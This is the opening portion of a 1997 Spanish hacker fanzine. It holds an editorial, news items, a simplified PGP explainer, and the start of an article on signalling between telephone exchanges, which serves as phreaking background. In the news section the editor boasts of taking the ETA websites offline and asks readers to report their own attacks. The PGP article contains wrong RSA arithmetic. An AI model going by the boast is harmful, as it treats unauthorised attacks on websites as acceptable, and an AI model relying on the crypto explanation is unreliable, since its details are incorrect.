ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ                SAQUEADORES EDICION TECNICA Nง10 25-7-97                   บ
บ                             Segunda Epoca                                 บ
วฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤถ
บ                   Fanzine del underground informatico                     บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

ษอออออออออออออออออหอออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ  Disponible en  บ  http://www.geocities.com/SiliconValley/8726            บ
บ                 บ  http://vanhackez.islatortuga.com                       บ
บ                 บ  Gorth BBS     2:340/25   Telf (928) 35 54 14           บ
บ                 บ  Editor:        Paseante <paseante@geocities.com>       บ
ศอออออออออออออออออสอออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ Todos los contenidos de esta revista son solamente educativos, ninguno    บ
บ pretende incitar al crimen o a la ilegalidad. Cualquier uso erroneo de    บ
บ esta informacion no es responsabilidad nuestra. Asimismo, no nos hacemos  บ
บ responsables de las informaciones u opiniones de nuestros colaboradores   บ
บ e informadores.                                                           บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ



LAMER, n., A person that will never learn, or never wants to learn anything
           except where to get the latest dirty pics or warezzzzzzzzz.  See
           also scientific class "doofus idiotus".




ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 01. CONTENIDOS                                                            บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Nง__Titulo/Autor___________________________________Tema_________Nivel tecnico_

01. Contenidos                                     Saqueadores 10

02. Presentacion                                   Saqueadores 10
                                                   
03. Noticias                                       Saqueadores 10

04. El PGP explicado para tontos/                  Criptografia   Medio
por Antonio Galvez

05. Red Telefonica Conmutada (II parte)/           Telefonia     Medio-alto
por El Profesor Falken

06. Escaneo de lineas en Espaคa V.2/               Telefonia      Medio
por el Duke de Sicilia

07. Gigantes con pies de barro/ por Paseante       Hackin         Medio-bajo

08. Los bugs del mes / Varios autores              Bugs           Variado

09. Reuniones del Underground / por el Duke        Cronica social

10. Moviles analogicos, reprogramacion y           Telefonia      Medio-alto
escaneo /por Cruiser

11. Colaboraciones y Peticiones                    Saqueadores 10

12. Las mejores publicaciones en ingles.           Publicaciones en ingles
La revista FEH/ por el Duke

13. Clave: Llevatela por la jeta /por Paseante     Hackin         Bajo

14  La voz del lector                              Correo de los lectores

15. Firewalls y Proxys II / por Paseante           Netsecurity    Medio-alto

15. Despedida                                      Saqueadores 10






ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 02.  PRESENTACION                                                         บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

Siii, ya estamos aqui otra vez y con una VICTORIA TOTAL sobre los
cibertarugos del mal. Vuelve el Duke (plas plas!) y sigue con nosotros
Eljaker aunque trabajando en "background". Ambos han salido con bien de toda
la movida que hubo el mes pasado en el mundillo under. Si no te enteraste de
nada no te preocupes y sigue durmiendo.
Hay muchisimas cosas que querria deciros, agradecer la cantidad de articulos,
mensajes de apoyo... he intentado contestaros a todos pero aunque no hayais
sabido nada de nosotros os lo agradecemos.
Brevemente:

- La mayor parte de nuestros colaboradores han vuelto a la vida, paso la
tormenta excepto para +8D2 y Ericx que siguen "missing in action"

- Si vuestro articulo no aparece aqui, tranquilos ญtenemos overbooking! :-)
ya lo vereis en siguientes numeros, si tampoco es asi no os desanimeis.
Zamora no se tomo en una hora. Seguid intentandolo, al menos aprendereis.

- En las encuestas recibidas a traves de nuestra pagina (gracias!) hemos
detectado que: para unos la revista es compleja, para otros no. Para unos
hay que tratar temas xyz, para otros vbw.. pero estais de acuerdo en 3 cosas.
* Mas hack
* Mas revista (todos la encontrais corta). Espero que no sea por peloteo ;)
* La revista es cojonuda. Gracias e igual que arriba ;)
Hemos tomado en cuenta los datos de la encuesta a la hora de elaborar la
revista, animamos a los que aun no la han hecho a que la hagan para que
podamos hacer una revista mas interesante.

-  De nuevo gracias por la solidaridad, viene muy bien. Ahora tenemos mas
ganas que nunca (aunque sea verano) de contar cosas y de seguir haciendo
una revista cada vez mejor.

Eso es todo, ahora sujetaos el cinturon. Despegamos.






ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 03. NOTICIAS                                                              บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


 Estrenamos seccion debido a la demanda detectada en la encuesta, veremos
 que tal sale :-)

 ** Hacking de la pagina "The Lost World" **

 La pelicula "El mundo perdido" tiene una pagina Web que fue hackeada
 a principios de julio, los principales medios de comunicacion se han
 hecho eco de ello.
 En Saqueadores no vamos a repetir la bazofia oficialista, aqui no nos
 creemo mucho de este "supuesto hack" y no somos los unicos.
 La pagina hackeada estuvo on-line de 3 a 8 Am, horas "muy convenientes"
 No presentaba las caracteristicas habituales del hack sino que todo era
 "muy potito" y apto para niคos.
 Universal ha conseguido un monton de publicidad extra, visitas al site
 y el "glamour" que desprende eso de haber sido victimas de un hacker
 Que cada uno opine lo que quiera, nosotros ya lo hacemos.


 ** Cierra el remailer Huge Cajones **

 Desgraciadamente, victima de un spammer, uno de los mejores
 y mas fiables remailers de Internet ha cerrado. El cierre se produjo
 el 1 de julio y no se sabe con certeza si volvera a la actividad.
 Para aquellos que me hayais enviado correo -a Paseante- seguramente no
 ha tenido repercusiones pero aunque cambie mis "reply block" tan rapido
 como pude y seguramente no se perdio ningun mensaje siempre cabe la
 posibilidad de que alguno de vuestros mensajes de finales de junio se
 perdiese mientras intentaba alcanzar mi buzon final pasando a traves
 de dicho remailer que era uno de mis preferidos.


 ** PGP 5.0 out! **

 Para los norteamericanos ya esta disponible el PGP 5.0 desde hace
 tiempo, cuando leais estas lineas puede que para los europeos tambien.
 No obstante desde principios de julio el PGP 5.0 se puede "downloadear"
 de la seccion de Archivos de Saqueadores (y sin cometer delito de
 exportacion ilegal!!).
 No pregunteis como ni porque, pero ya sabeis, si aun no ha salido en
 Europa, lo podeis coger de Saqueadores sin tener que mentir ni incurrir
 en delito.


 ** Cambios en Saqueadores **

 Tras la tormenta de los ultimos meses, se han producido cambios
 importantes en Saqueadores y se ha abierto un profundo debate en
 el grupo.
 Como ya sabeis el Duke y yo tomamos la responsabilidad de editar
 la revista mientras que otros miembros pasan a segundo plano.
 Pero en estos momentos se esta debatiendo el futuro de la revista,
 algunos defienden la continuidad mientras que otros votan por
 cambiar la revista de formato (html como mejor alternativa),
 de nombre (si, dejaria de ser Saqueadores) pero sobre todo de
 contenidos, no para hablar del tiempo ni de botanica sino de los
 mismos temas pero con niveles mas elevados (una revista + "elite"
 en suma)
 Cualquiera que haya leido SET con regularidad habra notado el
 incremento paulatino de contenidos y nivel de la misma, ahora
 mismo el grupo se halla dividido entre los que proponen continuar
 en esta linea y los que prefieren la linea "elite" (mejorar contenido,
 subir nivel drasticamente y restringir la circulacion para que no se
 haga muy popular).
 Los recientes jaleos han demostrado que SET es quiza "demasiado
 conocida" y eso ha influido en la toma de posturas.
 Os mantendremos informados, si quereis dar vuestra opinion podeis
 hacerlo por correo o dejando un comentario en el Web.


 ** HB apunta, ETA dispara **

 Todos vosotros sabeis ya que los asesinos han vuelto a la carga sumando
 su victima 815 en su "lucha" para liberar a un pueblo que les grita en
 la cara que estan de ellos "hasta los coj*nes".
 ETA ciega y criminal continua haciendo propaganda de su "lucha" en
 medios afines y a traves de Internet donde se puede leer el Euskal
 Herria Journal diciendo cosas como que "la manifestacion en Bilbao
 la componian espaคoles venidos en autocar" y tontadas semejantes.
 Despues de mucho pensar, de cavilar acerca de la libertad de expresion,
 el derecho a la censura y todo eso (y tras volver de una manifestacion)
 se me hincharon los coj*nes y las paginas que ETA tenia en IGC
 (vaya chiste!!) desaparecieron de la red durante UNA hora, esta hora es
 el mismo tiempo en que Euskadi paro para homenajear a Miguel Angel y
 considere que aun contra su voluntad los etarras debian sumarse al homenaje.
 Lamentablemente no fue posible colocar el lazo azul en vez de sus
 paginas, ya que debio haber previos intentos de hacking y la cosa fue
 bastante mas chunga de lo esperado.
 Es solo un gesto, es nuestro gesto y suponemos que no ha sido el unico.

 Por cierto, supongo que acabo de confesar un delito. :-?. Esta bien,
 venid a detenedme, soy un delincuente. Escribidnos diciendo lo que
 hicisteis vosotros o lo que sepais que hicieron a los etarras en Inet.





ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 04. EL PGP EXPLICADO PARA TONTOS                                          บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


                    EL PGP EXPLICADO PARA TONTOS

                        Por Antonio Galvez

 Vamos a intentar explicar como funciona el PGP de tal manera que TODO
 el mundo lo pueda entender, el texto esta lleno de imprecisiones y
 deformaciones que lo hace entendible para el profano pero que son una
 aberracion para el "experto".

 El motivo por el que esto existe es la cantidad de tonterias que se
 oyen de vez en cuando sobre el PGP diciendo que no es seguro y que
 se puede romper, ญCLARO QUE SE PUEDE ROMPERญ, pero tras trillones de
 milenios de calculos por cada mensaje. La ignorancia produce el
 miedo, lee, aprende, y sientete seguro, tienes motivos para ello.
 (Esto no quiere decir que fies, pero si dudas hazlo con fundamento)

 Si quieres mas y mejor informacion te recomiendo el LIBRO de Alfonso
 Martin que circula por la red, escrito en perfecto Espaคol y que es
 lo mejor que hay gratis sobre criptografia en el mundo.
 (crip_amp.arj de mas de 2 megas)

 Empecemos:

 El PGP combina 3 algoritmos (procesos) matematicos, para lograr:

 -Cifrar de forma "convencional". (usa el algoritmo IDEA)
 -Cifrar con criptografia de clave publica. (usa el RSA)
 -Hacer "CRC's" de alta seguridad contra manipulacion. (usa el MD5)

 El PGP permite que dos o mas personas se comuniquen de manera cifrada
 sin que tengan que pasarse claves por vias seguras (como el tlf o
 similar), tambien permite "firmar digitalmente", จcomo logra esto?,
 no es sencillo.

 Empecemos por lo mas sencillo, todo el mundo conoce los clasicos
 cifradores en los que tu metes un texto por un lado, una clave por el
 otro y el resultado 'solo' puede ser descifrado si se conoce la clave.

 El PGP usa este sistema por que es seguro y rapido, el solito elige
 la clave aleatoriamente en cada mensaje (tambien puedes elegirla tu
 si usas el PGP como cifrador convencional), esta mide 128 bits pero
 tiene el problema de como hacer saber al receptor cual es la clave.

 Aqui es donde entra el RSA, este algoritmo no funciona con una clave
 como la del algoritmo antes mencionado, si no que usa dos. Podria
 decirse que usa una para cifrar y otra para descifrar y que lo que
 una cifra SOLO la otra lo puede deshacer, จque como hace esto?, es
 muy curioso, alla va:

 El RSA:

 El RSA se basa en la exponenciacion y el modulo, supongamos que ya
 tenemos una pareja de claves RSA, una secreta y otra publica,
 queremos cifrar un nง (al final todo, textos ASCII, programas
 ejecutables, etc, se reduce a nง binarios), por ejemplo 1234
 (en la practica es un valor de 128 bits lo que hace que el nง tenga
 casi 40 digitos), nuestra clave va a ser de solo 11 bits de modulo
 (el maximo del PGP son 2047) y de 7 bits de exponente (no se cual
 es el maximo).
 Supongamos (todo ha sido elegido al azar como ejemplo):
 Mensaje a cifrar: 1234
 Modulo: 4313
 Esponente: 97

 Lo que haremos (mos o menos) es cojer el 1234 y multiplicarlo por si
 mismo un 97 veces, el resultado puede ser superior al nง de gotas
 de agua que hay en el mar. A este resultado lo dividimos por 4313
 hasta que el resultado sea menor de 4313 y no podamos dividir mas,
 entonces nos quedaremos con el resto de la division, supongamos que
 es 739.

 Fijaros que ni siquiera sabiendo el valor del modulo y del exponente
 se puede saber cual fue el nง que se cifrข, ญpuede ser casi
 cualquieraญ, desde 0 hasta el supuesto nง de gotas del mar uno de
 cada 4313 valores dara el mismo resultado, calcularlos todos es
 tarea de dioses y es imposible discernir cual es el autentico.

 Tu, viendo la salida, sabes que un nง elevado a 97 y con un modulo de
 4313 da 739, lo unico que puedes hacer es cojer y suponer que ese nง
 es 1 hacer la operacion, ver el resultado, si no es 739 suponer que
 es 2 y asi sucesivamente, pero te vas ha encontrar con que a lo mejor
 con el 2 va y te da 739, y con el 27 y con el 149 tambien, จcomo
 saber cual es el bueno?, y eso que aqui los nง son sencillos, en el
 caso del PGP que son 128 bits ญtardarias trillones de gigaeniosญ

 Si lo pensais, os direis, que entonces es imposible descifrar un
 mensaje cifrado con este sistema, este es el secreto del RSA, esos
 valores que he puesto como ejemplo (el del modulo y exponente) en
 realidad no se eligen tan al azar, el PGP en base a valores
 aleatorios (si no todos tendriamos la misma clave จno?) calcula una
 pareja modulo-exponente en base a la cual y a un sistema que ya no
 soy capaz de explicar (ni es la intencion de este texto explicar el
 RSA en profundidad), determina otra pareja modulo-exponente que ES
 LA INVERSA de la anterior, es decir que si tu cojes el 739 y lo
 multiplicas por si mismo (lo elevas a la potencia) del exponente
 inverso del que hablamos antes y le restas el nง inverso hasta que
 no puedas mas (es decir: le calculas el modulo) TE DARA EL VALOR
 ORIGINAL, me explico:

 Supongamos que las inversas son:
 Modulo: 3727
 Exponente: 31

 Cojeremos el 739 lo elevamos a 31 (es decir, lo multiplicamos por si
 mismo treinta y una veces) y el resultadillo lo dividimos por 3727 y
 nos quedamos con el resto de la division (es decir: calculamos el
 modulo, o dicho de otra forma: le restamos 3727 hasta que no se
 pueda hacer mas y nos quedamos con el resultado), el resultado sera
 1234.

 Naturalmente quien conozca la pareja modulo exponente publica NO
 puede calcular la privada sin dejarse la vida en ello, claro, o por
 lo menos de momento nadie lo ha logrado, y no hablo de hakers de 16
 aคos, hablo de expertos matematicos de la comunidad internacional,
 todos lo buscan (si lo encuentran se forran) y nadie ha logrado
 encontrar un sistema que no requiera morirse calculando.

 Despues de esto queda explicar, mas o menos, como funciona el IDEA.

 El IDEA:

 Aqui explicare mas o menos lo que hace, para que te hagas a la idea,
 si quieres enterarte bien, pillate el libro electronico de Alfonso
 Martin.

 El IDEA combina 3 operaciones matematicas reversibles:

 El OR exclusivo. (XOR)  (se representa con un '$')
 La suma.                (se representa con un '+')
 La multiplicacion.      (se representa con un 'x')

 Primero divide el texto a cifrar el bloques de 64 bits, lo divide en
 4 trozos de 16 bits y empieza la fiesta:
 Todas las operaciones se hace sobre 16 bits y el resultado es de 16
 bits siempre. (la multiplicacion de dos operadores de 16 bits dara
 un resultado de 16 bits)

 Al primer cacho se le multiplica una subclave (luego cuento de
 donde salen), al segundo le suma otra subclave, al 3 lo mismo y al
 cuarto le hace lo mismo que primero, Luego se coje el resultado de
 la operacion 1 y 3 y se les hace una XOR, lo mismo hacemos
 con el resultado de las operaciones 2 y 4, al resultado de la
 OR del 1-3 le multiplicamos otra subclave y el resultado lo sumamos
 al resultado del OR de los operandos 2-4 y tambien le hacemos una
 suma con el resultado del OR de los operandos 2-4 despues de
 haberles sumado el resultado de la OR de el resultado de la op. OR
 con la ultima subclave mencionada, aqui hemos llegado a la mitad de
 la explicacion de la primera ronda (son 8) y como me imagino que
 nadie se esta enterando, mejor lo dejamos y miramos el dibujito.

 El algoritmo esta muy bien estudiado, si por ejemplo tu metes todo
 AAAAAAAAAA's con una clave cualquiera, por ejemplo todo AAAAAAA's
 tambien, el resultado sera como un fichero comprimido, completamente
 aleatorio.

 Las X1,2,3,4 son los 4 trozos del primer bloque de 64 bits.
 Las Z1,2,3,4,5,6 son las subclaves que se obtienen de la clave.

         X1             X2                        X3          X4
         ณ              ณ                         ณ           ณ
    Z1ฤ> x          Z2ฤ>+                     Z3ฤ>+       Z4ฤ>x
         ณ              ณ                         ณ           ณ
         รฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ >$<ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤด           ณ
         ณ              ณ     ณ                   ณ           ณ
         ณ              รฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ>$< ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤด
         ณ              ณ     ณ            ณ      ณ           ณ
         ณ              ณ     ณ            ณ      ณ           ณ
         ณ              ณ Z5ฤ>xฤฤฤฤฤฤฤฤฤฤฤ>+      ณ           ณ
         ณ              ณ     ณ            ณ      ณ           ณ
         ณ              ณ     ณ            ณ      ณ           ณ
         ณ              ณ     ณ            ณ      ณ           ณ
         ณ              ณ     +<ฤฤฤฤฤฤฤฤฤ  x<ฤZ6  ณ           ณ
         ณ              ณ     ณ            ณ      ณ           ณ
         ณ              ณ     ณ            ณ      ณ           ณ
         $<ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤมฤฤฤฤฤ>$           ณ
         ณ              ณ     ณ                   ณ           ณ
         ณ              $<ฤฤฤฤมฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ> $
         ณ              ภฤฤฤฤฤฤฤฤจ        ฺฤฤฤฤฤฤฤู           ณ
         ณ                       ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤจ           ณ
         ณ              ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู       ณ           ณ
         X'1            X'2                       X'3         X'4

         Esto se hace 8 veces, volviendo a meter la salida por la
 entrada y canbiando las subclaves, despues se aplica la transformacion de
 salida:

        X'1            X'2                        X'3        X'4
        ณ              ณ                           ณ          ณ
        ณ              ณ             ฺฤฤฤฤฤฤฤฤฤฤฤฤฤู          ณ
        ณ              ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤจ          ณ
        ณ              ฺฤฤฤฤฤฤฤฤฤฤฤฤฤู             ณ          ณ
  Z'1ฤ> x        Z'2ฤ> +                     Z'3ฤ> +    Z'4ฤ> x
        ณ              ณ                           ณ          ณ
        Y1             Y2                          Y3         Y4

 Para obtener las subclaves se "cifra" clave original de 128 bits de
 una manera similar a como se hace con el mensaje.

 Los bloques de 64 bits resultantes pueden ser usados para cifrar los
 bloques siguientes de varias formas para que todos se afecten a todos
 pero no si hace esto el PGP ni como lo hace.

 El mensaje queda hecho un churro que no lo reconoce ni su padre, pero
 conociendo la clave no es ningun problema deshacer el proceso.
 Y si no conoces la clave solo tienes que ponerte a probar hasta que
 te salga algo logico, como solo hay 2 elevado a 128 posibilidades si
 tienes una maquina capaz de resolver mil millones de IDEAS por
 segundo (vamos, ni el HAL 9000) tardaras 1.079.020.000.000.000
 millones de aคos en encontrarlas todas, asi que en la mitad de tiempo
 como media podran encontrartela, pero siempre habra algun gilipollas
 que dira que el PGP se puede descifrar y no es seguro.

 El PGP cambia la clave en cada mensaje eligiendo una aleatoriamente,
 excepto cuando se le usa como cifrador convencional, ese caso solo
 usa el IDEA y el MD5 unicamente y la clave la eliges tu.

 El MD5.

 Otro algoritmo que usa el PGP es el MD5, este algoritmo debe ser
 conocido para cualquier hacker que halla intentado crakear alguna
 password de linux o de otros sistemas ya que es un sistema muy usado.
 El MD5 no sirve para cifrar un mensaje ya que lo destruye
 completamente, el MD5 (o su hermano menor el MD2 o el MD4) "cifran"
 una entrada de forma ireversible, la informacion no es recuperable de
 ninguna manera ya que hay perdida de informacion.
 El PGP lo usa para firmar y para aคadir un "CRC" de alta seguridad a
 los mensajes para que estos en caso de alteracion sean rechazados.

 EL mensaje entero se pone en la entrada del MD5, y la salida
 (normalmente 128 bits) se cifra con clave secreta del RSA y se pone
 al final. El destinatario como tiene la clave publica puede deshacer
 lo que hizo la clave secreta (leer mas arriba) y ver el "CRC" del MD5
 no tiene mas que descifrar el mensaje, pasarlo tambien por el MD5 y
 comprobar que son iguales para saber si alguien ha cambiado un solo
 bit del mensaje original.

 El MD5 divide la entrada en bloques de 512 bits (si es mas pequeคo
 lo rellena con ceros) y les hace una serie de operaciones que dejan
 en ridiculo al IDEA ya que estas no tienen por que ser reversibles se
 aplican con mucha mas fuerza, todos los bits de la entrada determinan
 los bits de salida, todos se afectan a todos, si varias uno solo de
 los bits de la entrada, la salida no tendra nada que ver con la
 anterior.

 Si alguien quiere alterar un mensaje firmado lo tiene muy facil, solo
 tiene que cambiarlo y calcular el MD5, como no sera igual que el que
 firmo con el RSA el autor original tendra que cambiar algo del
 mensaje alterado y repetir el proceso, asi hasta que lo encuentre,
 como SOLO tardara unos pocos miles de millones de aคos le sera
 suficiente con un poco de paciencia.

                             FIN

 Este texto es de libre distribucion siempre que no se altere su
 contenido ni el nombre del autor, se PROHIBE TOTALMENTE su
 traduccion al ingles salvo expresa autorizacion del autor, la cual
 solo se dara si un ingles traduce un texto similar al Espaคol.

 El autor ni se hace responsable de nada, ni ha sido el, ni nadie le
 ha visto, ademas, no teneis pruebas...

               EB4CAK     Packet: EB4CAK@EA4EEN.EAM.ES.EU
           eb4cak@nos.ea4rct.ampr.org        agalvezc@nexo.es
         PGP:  68 3A 7B 4E BC 6A 59 68  C6 82 36 BD FF 54 65 1E






ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 05. RED TELEFONICA CONMUTADA (II PARTE)                                   บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ



       _/_/_/_/             Red Telefonica Conmutada            \_\_\_\_
      _/_/_/_/                   Segunda parte                   \_\_\_\_
     _/_/_/_/                                                     \_\_\_\_
    _/_/_/_/                 por el Profesor Falken                \_\_\_\_


NOTA :  Todo lo que se recoge a continuacion es de caracter informativo.
=====   El mal uso que pueda realizarse de la informacion aqui recogida es
        unicamente responsabilidad del lector. El autor se desentiende por
        completo de lo que hagais. จQueda claro? (La paranoia de turno ;))



    En la primera parte de esta serie de articulos sobre la RTC hablamos de
las bases de la RTC y su definicion. Tambien empezamos con el concepto de la
seคalizacion y describimos la seคalizacion que se produce entre el abonado
y la central.
    Algunos de vosotros recordareis que en el anterior articulo se mencionaba
la existencia de seคales de teletarificacion. Estas seคales no fueron
desarrolladas posteriormente por no usarse (o casi) en la actualidad. Pero
para dejaros tranquilos, simplemente deciros que se basa en unos impulsos de
50Hz. o 12Hz. que la central envia al abonado. Este abonado debe contratar
previamente el servicio, pues esta seคal es la que usa el contador de pasos
que antiguamente podiamos ver en algunos bares y cafeterias. Asi pues, a
menos que dispongais de un contador de pasos en el telefono, no recibireis
estas seคales.

    En este articulo trataremos los diversos tipos de seคalizacion que se
producen entre las centrales telefonicas.

    Quizas a algunos ya os suene lo que aqui se diga por haberlo leido en el
documento SOKOTEL que antes del cierre podiais encontrar en IBERHACK. (Puede
que vuelvan a colgarlo). Pero hay algunas modificaciones, e intentare
desarrollarlo de la forma mas simple posible, para que tod@s lo entendais.
    Ademas, dicho documento parece copiado directamente del libro sobre
seคalizacion en redes telefonicas de Vega, pero con algunos pequeคos deslices
que intentare corregir.

    Ya esta bien de charla, comencemos con...


SEฅALIZACION ENTRE CENTRALES
============================

    Como habreis deducido, se trata de las seคales que intercambian las
centrales para la gestion de una comunicacion. Estas seคales pueden estar
clasificadas de acuerdo a diversos factores:

             * Por su origen y destino.
             * Por su naturaleza fisica.
             * Por el sentido de la transmision.

    La primera distincion que podemos realizar, mas evidente, se basa en lo
que podemos encontrar en una central. La central esta compuesta por los
enlaces y por los registradores.

    No creo que tenga que deciros que es un enlace. จQue no lo sabeis? Pues
estamos listos. Un enlace no es mas que por donde la central se conecta con
la linea. Como el conector donde enganchais el telefono en vuestra casa. (Que
por cierto, el conector ese de vuestra casa, que tendra 2 o 4 cablecillos, y
que tiene capacidad para 6, se denomina RJ-11, p'a que vacileis a los
amigos :))
    El registrador es simplemente un organo de la unidad de control de la
central.

    De esta forma tenemos ya lista la clasificacion de las seคales segun su
origen y destino. Por una parte tenemos las seคales usadas para el dialogo
entre los enlaces, a lo que denominamos SEฅALES DE LINEA, y por otra, estan
las seคales intercambiadas en el dialogo de las unidades de control o SEฅALES
DE REGISTRADOR.
    De forma grafica:

       CENTRAL A                                             CENTRAL B
  +-----------------+                                   +-----------------+
  |      +--------* - * - * - * - * - * - * - * - * - * - *--------+      |
  |      | ENLACE |---------------------------------------| ENLACE |      |
  |   +===============================================================+   |
  |   |  +--------+ |                                   | +--------+  |   |
  |   |  | ENLACE | |                                   | | ENLACE |  |   |
  |   |  +--------+ |                                   | +--------+  |   |
  |   |      ::     |                                   |     ::      |   |
  |   |  +--------+ |                                   | +--------+  |   |
  |   |  | ENLACE | |                                   | | ENLACE |  |   |
  |   |  +--------+ |                                   | +--------+  |   |
  | +-+-----------+ |                                   | +-----------+-+ |
  | | REGISTRADOR | |                                   | | REGISTRADOR | |
  | +-------------+ |                                   | +-------------+ |
  +-----------------+                                   +-----------------+

  - * - SEฅALES DE LINEA
  ===== SEฅALES DE REGISTRADOR


    Asi, las seคales de linea, tambien llamadas de supervision, se encargan
entre otras cosas de:

            * Iniciar el dialogo previo.
            * Retransmitir la tarificacion.
            * Liberar los organos usados en la comunicacion.

    Por su parte, las seคales de registrador, conocidas tambien como de
informacion, se usan para:

            * Seleccionar al abonado.
            * Dar el estado de la linea alcanzada.
            * Dar la categoria del abonado.
            * ...


    Ya hemos visto como se clasifican las seคales segun su origen y destino.
En el dialogo entre las centrales, las seคales intercambiadas pueden tener
origen en la central que inicia la comunicacion o en la central destino de la
comunicacion. Asi distinguimos entre dos tipos de seคales, segun el sentido
de la transmision:

            * Seคales hacia delante (Central origen -> Central destino).
            * Seคales hacia atras   (Central origen <- Central destino).

    Y solo nos queda la clasificacion de las seคales segun su naturaleza
fisica. Ahi va la tabla, a ver si cuela:

        * En corriente continua.
             * Simple cambio de estado.
             * Impulsiva.
             * Telegrafica.
        * En corriente alterna.
             * Una sola frecuencia.
                   * Dentro de banda.
                            * Simple cambio de estado.
                            * Impulsiva.
                            * Telegrafica.
                   * Fuera de banda.
                            * Simple cambio de estado.
                            * Impulsiva (raras ocasiones).
             * Varias frecuencias. (Siempre dentro de banda).
                   * No simultaneas.
                   * Simultaneas. (Multifrecuencia).
                            * Dos entre cinco (2/5).
                            * Dos entre seis (2/6).
        * Numericas
             * Dentro de intervalo.
             * Fuera de intervalo.
             * Por mensajes.


    (Bueno, parece que cuela. A ver si... Pos no, no ha colado, tendre que
explicarlo).

    Como veis, existen tres grupos de seคales segun su naturaleza. Las que
corresponden a corriente continua, no creo necesiten explicacion, จo si?
จQue si? Pos fale.
    El simple cambio de estado es eso, un cambio de estado en la seคal
presente.
    El impulso es el doble cambio de estado consecutivo. Esto produce un
pulso. De ahi lo de impulso (Y que nadie se piense que pasa lo mismo que en
el anuncio).
    Y queda la telegrafica, que es establecer un codigo a base de impulsos
(como el MORSE) para la comunicacion entre las dos centrales.
    (ญHuy, que dificil!)
    Para las seคales que pertenecen al grupo de corriente alterna se puede
aplicar lo dicho para corriente continua. Solo destacar que lo de dentro o
fuera de banda se refiere a si la seคal esta dentro del ancho de banda de un
canal telefonico (300 a 3400 Hz).

    Veamos ahora las diferentes seคales que se intercambian las centrales.
Para ello usaremos la clasificacion de seคales segun su origen y destino, por
ser la mas sencilla (ademas de la que os podreis encontrar en la mayoria de
los libros sobre telefonia).


SEฅALIZACION DE LINEA
=====================

    Estas seคales, como ya se ha dicho, son las intercambiadas entre los
enlaces de las distintas centrales que intervienen en una comunicacion. Los
diversos tipos de seคales que nos podemos encontrar son:

            * Disponibilidad - Es una seคal transmitida hacia atras para
                               indicar que el enlace de llegada esta
                               dispuesto para establecer la conexion.
            * Bloqueo - Tambien es una seคal hacia atras que indica que el
                        enlace de llegada no esta dispuesto para establecer
                        la conexion. Recibir esta seคal provoca que el
                        enlace de salida quede no disponible.
            * Toma - Seคal hacia delante que provoca que el enlace de llegada
                     pase a la posicion de trabajo, desencadenando en la toma
                     u ocupacion de un registrador de la Unidad de Control de
                     la cental distante, para encaminar la llamada.
            * Invitacion a transmitir - Tambien conocida como CONTROL DE TOMA.
                                        Seคal hacia atras que informa que se
                                        han establecido las conexiones
                                        necesarias para recibir las seคales
                                        de direccion (cifras de abonado).
            * Respuesta - Seคal hacia atras que indica que el abonado llamado
                          ha contestado. Comienza la conversacion entre los
                          dos abonados y la tarificacion (ญInteresante!).
            * Colgar - Seคal hacia atras que indica que el abonado llamado
                       ha colgado. Despues de recibir esta seคal, la central
                       esperara un tiempo predeterminado a que el abonado
                       llamante cuelgue. De no colgar, pasado este tiempo,
                       se liberara la conexion y se parara la tarificacion.
            * Desconexion - Seคal hacia delante que se produce cuando es el
                            abonado llamante el que cuelga, o cuando vence el
                            temporizador activado al recibir la seคal de
                            Colgar.
            * Liberacion de guarda - Seคal hacia atras como confirmacion de
                                     la recepcion de la seคal de Desconexion.


    De los muchos sistemas normalizados de seคalizacion de linea, el usado
actualmente en Espaคa es el conocido como seคalizacion E y M.
    Este tipo de seคalizacion se basa en el envio de una seคal de 3825 Hz en
cada sentido de transmision y como se ve, fuera de banda, por el mismo canal
de conversacion. El metodo usado es el metodo de cambios de estado.
    En la siguiente tabla se recogen las caracteristicas mas importantes de
las seคales utilizadas en la seคalizacion de linea E y M:

   +----------------+--------------+-------------+---------------------+
   |                |  DIRECCION   |  DURACION   |      TONALIDAD      |
   |     SEฅAL      |      DE      |     DE      +----------+----------+
   |                | TRANSMISION  | TRANSMISION |  ORIGEN  | DESTINO  |
   +----------------+--------------+-------------+----------+----------+
   | Disponibilidad |  --------->  | Continua    | Presente | Presente |
   |                |  <---------  |             |          |          |
   +----------------+--------------+-------------+----------+----------+
   | Toma           |  - - - - ->  | Continua    | Ausente  | Presente |
   |                |  <---------  |             |          |          |
